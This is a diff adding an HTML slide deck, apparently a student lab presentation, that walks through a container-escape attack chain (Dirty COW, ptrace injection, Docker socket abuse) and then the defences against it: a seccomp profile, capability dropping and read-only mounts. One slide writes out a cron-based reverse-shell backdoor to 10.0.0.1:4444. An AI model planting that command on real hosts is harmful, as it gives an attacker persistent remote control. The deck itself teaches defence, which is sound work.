@@ -1,0 +1,299 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Hexa Force - Security Presentation</title>
+
+    <!-- Reveal.js core CSS -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.3.1/reset.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.3.1/reveal.min.css">
+    
+    <!-- Custom Dark/Cyberpunk Theme -->
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;500;700;900&family=Fira+Code:wght@400;700&display=swap');
+
+        :root {
+            --bg-color: #07090f;
+            --primary: #00f3ff;
+            --danger: #ff003c;
+            --success: #00ff66;
+            --text-color: #e2e8f0;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            background-image: 
+                radial-gradient(circle at 50% 50%, rgba(0, 243, 255, 0.05) 0%, transparent 50%),
+                linear-gradient(rgba(255,255,255,0.03) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(255,255,255,0.03) 1px, transparent 1px);
+            background-size: 100% 100%, 30px 30px, 30px 30px;
+            font-family: 'Space Grotesk', sans-serif;
+        }
+
+        .reveal {
+            color: var(--text-color);
+            font-family: 'Space Grotesk', sans-serif;
+        }
+
+        .reveal h1, .reveal h2, .reveal h3, .reveal h4 {
+            font-family: 'Space Grotesk', sans-serif;
+            text-transform: uppercase;
+            letter-spacing: -1px;
+            margin-bottom: 20px;
+        }
+
+        .reveal h1 { font-weight: 900; font-size: 4em; text-shadow: 0 0 30px rgba(0, 243, 255, 0.3); }
+        .reveal h2 { font-weight: 700; color: #fff; font-size: 2.5em; }
+        .reveal h3 { font-weight: 500; color: #8892b0; }
+
+        .text-cyan { color: var(--primary); text-shadow: 0 0 15px rgba(0, 243, 255, 0.5); }
+        .text-red { color: var(--danger); text-shadow: 0 0 15px rgba(255, 0, 60, 0.5); }
+        .text-green { color: var(--success); text-shadow: 0 0 15px rgba(0, 255, 102, 0.5); }
+
+        /* Glassmorphism boxes */
+        .glass-box {
+            background: rgba(20, 25, 40, 0.6);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 15px;
+            padding: 30px;
+            margin: 20px 0;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+            text-align: left;
+        }
+
+        .glass-box.red-border { border-left: 5px solid var(--danger); }
+        .glass-box.green-border { border-left: 5px solid var(--success); }
+
+        /* Terminal code snippets */
+        code {
+            font-family: 'Fira Code', monospace;
+            background: #0d1117;
+            padding: 5px 10px;
+            border-radius: 5px;
+            border: 1px solid #30363d;
+            color: var(--primary);
+            font-size: 0.9em;
+        }
+
+        .reveal pre {
+            width: 100%;
+            margin: 20px 0;
+            background: #0d1117;
+            border: 1px solid #30363d;
+            border-radius: 10px;
+            box-shadow: inset 0 0 20px rgba(0,0,0,0.5);
+        }
+
+        .reveal pre code {
+            padding: 20px;
+            font-size: 1.1em;
+            color: #c9d1d9;
+            background: transparent;
+            border: none;
+        }
+
+        .flex-container {
+            display: flex;
+            gap: 30px;
+            justify-content: center;
+            align-items: stretch;
+        }
+        .flex-col { flex: 1; }
+
+        /* Progress Bar override */
+        .reveal .progress { height: 5px; color: var(--primary); }
+        .reveal .controls { color: var(--primary); }
+
+        ul { text-align: left; line-height: 1.8; }
+        li { margin-bottom: 15px; }
+
+    </style>
+</head>
+<body>
+
+    <div class="reveal">
+        <div class="slides">
+
+            <!-- Slide 1: Title -->
+            <section data-transition="zoom">
+                <h1>Hexa <span class="text-cyan">Force</span></h1>
+                <h3>Securing Shared-Kernel Runtimes</h3>
+                <p style="margin-top: 50px; color: #8892b0;">Advanced Container Security & Containment Architecture Lab</p>
+                <small>Use arrow keys to navigate</small>
+            </section>
+
+            <!-- Slide 2: Core Problem -->
+            <section data-transition="fade">
+                <h2>The Core <span class="text-red">Problem</span></h2>
+                <div class="glass-box">
+                    <p style="font-size: 1.2em;">Containers are <strong>not</strong> Virtual Machines.</p>
+                    <p>They share the underlying physical Host OS Kernel. If an attacker exploits a vulnerability in the host kernel from inside a container, <strong>all logical isolation instantly collapses.</strong></p>
+                </div>
+                <div class="flex-container" style="margin-top: 20px;">
+                    <div class="glass-box red-border flex-col" style="text-align:center;">
+                        <h4 class="text-red">Namespace Illusion</h4>
+                        <p>PID, NET, and MNT namespaces are just filters, not physical boundaries.</p>
+                    </div>
+                    <div class="glass-box red-border flex-col" style="text-align:center;">
+                        <h4 class="text-red">Shared Memory</h4>
+                        <p>Memory management (like COW) is handled by the shared host kernel.</p>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Slide 3: 4-Stage Threat Model -->
+            <section data-transition="slide">
+                <h2>The 4-Stage <span class="text-red">Threat Model</span></h2>
+                <p>A cascading failure from app compromise to physical host takeover.</p>
+                <div class="glass-box red-border">
+                    <ol style="font-size: 1.2em; line-height: 2;">
+                        <li><strong>Kernel Exploit:</strong> Dirty COW (CVE-2016-5195)</li>
+                        <li><strong>Lateral Movement:</strong> Ptrace Process Injection</li>
+                        <li><strong>API Hijacking:</strong> Docker Daemon Compromise</li>
+                        <li><strong>Persistent Takeover:</strong> Host Cron Backdoor</li>
+                    </ol>
+                </div>
+            </section>
+
+            <!-- Slide 4: Stage 1 Exploit -->
+            <section data-transition="slide">
+                <h2><span class="text-red">Stage 1:</span> The Kernel Exploit</h2>
+                <div class="flex-container">
+                    <div class="flex-col" style="text-align: left;">
+                        <p><strong>Action:</strong> The attacker triggers the Dirty COW race condition.</p>
+                        <p>By simultaneously calling <code>madvise()</code> and writing to <code>/proc/self/mem</code>, they trick the kernel into overwriting read-only system files.</p>
+                        <h4 class="text-red" style="margin-top: 30px;">Impact:</h4>
+                        <p>Immediate <strong>Privilege Escalation</strong> to root inside the container.</p>
+                    </div>
+                    <div class="flex-col">
+                        <pre><code>$ ./hexaforce_cow --exploit
+
+[!] Racing madvise...
+[!] Writing to /proc/self/mem...
+[*] Overwriting /usr/bin/passwd
+[+] Success!
+[+] Container root achieved.</code></pre>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Slide 5: Stage 2 & 3 -->
+            <section data-transition="slide">
+                <h2><span class="text-red">Stage 2 & 3:</span> Lateral & API Hijack</h2>
+                <div class="glass-box red-border">
+                    <p><strong>Lateral Movement:</strong></p>
+                    <p>Abusing <code>CAP_SYS_PTRACE</code> across shared PID namespaces to inject malicious shellcode into host daemons.</p>
+                </div>
+                <div class="glass-box red-border">
+                    <p><strong>API Hijacking:</strong></p>
+                    <p>Accessing a carelessly mounted <code>/var/run/docker.sock</code> to gain raw HTTP control over the host's Docker engine.</p>
+                </div>
+            </section>
+
+            <!-- Slide 6: Stage 4 -->
+            <section data-transition="slide">
+                <h2><span class="text-red">Stage 4:</span> Persistent Takeover</h2>
+                <p>The final blow to the infrastructure.</p>
+                <div class="glass-box red-border">
+                    <p>Using the hijacked API, the attacker spawns a new sibling container that mounts the host's root physical directory (<code>/</code>).</p>
+                    <pre><code>echo "* * * * * root bash -i >& /dev/tcp/10.0.0.1/4444 0>&1" 
+> /mnt/host/etc/cron.d/backdoor</code></pre>
+                    <h4 class="text-red">Impact:</h4>
+                    <p>Total, persistent compromise of the underlying bare-metal infrastructure.</p>
+                </div>
+            </section>
+
+            <!-- Slide 7: Defense Architecture -->
+            <section data-transition="zoom">
+                <h2>The Hexa Force <span class="text-green">Defense</span></h2>
+                <p>An 8-Layer Defense-in-Depth Architecture</p>
+                <div class="flex-container">
+                    <div class="glass-box green-border flex-col">
+                        <h4>1. Kernel Level</h4>
+                        <p>Seccomp BPF Filtering</p>
+                    </div>
+                    <div class="glass-box green-border flex-col">
+                        <h4>2. Process Level</h4>
+                        <p>Capability Dropping</p>
+                    </div>
+                </div>
+                <div class="flex-container">
+                    <div class="glass-box green-border flex-col">
+                        <h4>3. System Level</h4>
+                        <p>Immutable Mounts</p>
+                    </div>
+                    <div class="glass-box green-border flex-col">
+                        <h4>4. Pipeline Level</h4>
+                        <p>Cosign Image Signing</p>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Slide 8: Stopping Kernel Exploit -->
+            <section data-transition="slide">
+                <h2>Stopping the <span class="text-green">Kernel Exploit</span></h2>
+                <div class="flex-container">
+                    <div class="flex-col" style="text-align: left;">
+                        <p><strong>Action:</strong> Deploy a custom eBPF Seccomp profile.</p>
+                        <p>By explicitly blocking the <code>madvise</code> system call, the kernel immediately rejects the attacker's request.</p>
+                        <h4 class="text-green" style="margin-top: 30px;">Impact:</h4>
+                        <p>The Dirty COW race condition is neutralized at the kernel boundary before it can even begin execution.</p>
+                    </div>
+                    <div class="flex-col">
+                        <pre><code>{
+  "defaultAction": "SCMP_ACT_ALLOW",
+  "syscalls": [
+    {
+      "names": ["madvise"],
+      "action": "SCMP_ACT_ERRNO"
+    }
+  ]
+}</code></pre>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Slide 9: Stopping Lateral Movement -->
+            <section data-transition="slide">
+                <h2>Stopping <span class="text-green">Lateral Movement</span></h2>
+                <div class="glass-box green-border">
+                    <p>Enforce the <strong>Principle of Least Privilege</strong>.</p>
+                    <ul>
+                        <li>Drop <code>CAP_SYS_PTRACE</code> to make process injection mathematically impossible.</li>
+                        <li>Enforce isolated PID namespaces so host processes are invisible.</li>
+                        <li>Use <code>--read-only</code> flags to make filesystems immutable, preventing cron backdoor installations.</li>
+                    </ul>
+                </div>
+                <pre><code>docker run --cap-drop=ALL --read-only --security-opt no-new-privileges</code></pre>
+            </section>
+
+            <!-- Slide 10: Conclusion -->
+            <section data-transition="fade">
+                <h2><span class="text-cyan">Conclusion</span></h2>
+                <div class="glass-box" style="text-align: center;">
+                    <p style="font-size: 1.3em; margin-bottom: 30px;">"True container security assumes breach and builds immutable boundaries."</p>
+                    <p>Runtime security (Seccomp, Capabilities) must be paired with automated supply chain verification (Trivy + Sigstore) for true DevSecOps.</p>
+                </div>
+                <h3 style="margin-top: 40px;">Thank You</h3>
+                <p>Hexa Force Team (G25ait2026)</p>
+            </section>
+
+        </div>
+    </div>
+
+    <!-- Reveal.js Core Scripts -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.3.1/reveal.min.js"></script>
+    <script>
+        Reveal.initialize({
+            hash: true,
+            controls: true,
+            progress: true,
+            center: true,
+            transition: 'slide', // none/fade/slide/convex/concave/zoom
+            backgroundTransition: 'fade'
+        });
+    </script>
+</body>
+</html>
